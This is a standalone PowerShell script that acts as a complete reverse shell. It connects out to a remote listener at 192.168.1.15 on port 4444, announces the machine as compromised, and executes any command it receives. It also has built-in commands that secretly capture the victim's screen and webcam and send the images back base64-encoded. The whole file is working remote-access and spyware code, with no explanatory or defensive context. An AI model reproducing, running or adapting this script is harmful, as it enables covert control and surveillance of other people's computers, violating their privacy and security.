# --- THE FINAL BOSS: FULL LOOT VERSION ---
$ip = '192.168.1.15'
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient
$c.Connect($ip, $port)
$s = $c.GetStream()
$r = New-Object System.IO.StreamReader($s)
$w = New-Object System.IO.StreamWriter($s)
$w.AutoFlush = $true

$w.WriteLine("--- SYSTEM COMPROMISED: $($env:COMPUTERNAME) ---")

while($c.Connected) {
    $w.Write("PS " + (Get-Location).Path + "> ")
    $raw = $r.ReadLine()
    if ($null -eq $raw) { break }
    $cmd = $raw.Trim()
    if ($cmd -eq "exit") { break }

    if ($cmd -eq "screenshot") {
        # --- SCREENSHOT ---
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
        $mem = New-Object System.IO.MemoryStream
        $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $out = [Convert]::ToBase64String($mem.ToArray())
        $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
        $w.WriteLine($out)
    } 
    elseif ($cmd -eq "webcam") {
        # --- WEBCAM (STABLE WINRT) ---
        try {
            # Load WinRT Projection
            [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
            [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.Properties, ContentType=WindowsRuntime]
            
            $mc = New-Object Windows.Media.Capture.MediaCapture
            $mc.InitializeAsync().GetAwaiter().GetResult()
            
            $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
            $low = $mc.PrepareLowLagPhotoCaptureAsync($fmt).GetAwaiter().GetResult()
            $photo = $low.CaptureAsync().GetAwaiter().GetResult()
            
            # Use .AsStreamForRead() from the WinRT projection
            $stream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
            $ms = New-Object System.IO.MemoryStream
            $stream.CopyTo($ms)
            
            $out = [Convert]::ToBase64String($ms.ToArray())
            $ms.Dispose(); $stream.Dispose(); $mc.Dispose()
            $w.WriteLine($out)
        } catch {
            $w.WriteLine("Webcam Error: $($_.Exception.Message)")
        }
    }
    else {
        # --- COMMANDS ---
        $out = iex $cmd 2>&1 | Out-String
        $w.WriteLine($out)
    }
}
$c.Close()
